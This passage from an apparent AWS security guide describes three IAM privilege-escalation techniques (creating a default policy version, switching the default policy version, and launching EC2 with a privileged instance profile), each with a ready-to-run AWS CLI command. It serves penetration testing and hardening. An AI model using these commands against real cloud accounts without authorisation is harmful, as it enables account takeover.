### 2 - Creating a new policy version

An attacker with the `iam:CreatePolicyVersion` permission can create a new version of an IAM policy that they have access to. Using the `--set-as-default` flag, they can set the new version as the default without needing `iam:SetDefaultPolicyVersion`.

**Example Command:**

```shell
aws iam create-policy-version --policy-arn target_policy_arn --policy-document file://path/to/administrator/policy.json --set-as-default
```

**Potential Impact:**  
This could grant the attacker full administrator access to the AWS account.

---

### 3 - Setting the default policy version to an existing version

Up to five versions of policies are allowed per user or group. An attacker with `iam:SetDefaultPolicyVersion` can change the default version of a policy to an existing version with elevated privileges, if it exists.

**Example Command:**

```shell
aws iam set-default-policy-version --policy-arn target_policy_arn --version-id v2
```

**Potential Impact:**  
Privilege escalation depends on permissions of the selected version.

---

### 3 - Creating an EC2 Instance with an existing Instance profile

With `iam:PassRole` and `ec2:RunInstances`, an attacker can create an EC2 instance and use the instance profile's credentials for elevated access.

**Example Command:**

```shell
aws ec2 run-instances --image-id ami-a4dc46db --instance-type t2.micro --iam-instance-profile Name=iam-full-access-ip
```

**Potential Impact:**  
Allows access to permissions associated with the instance profile.
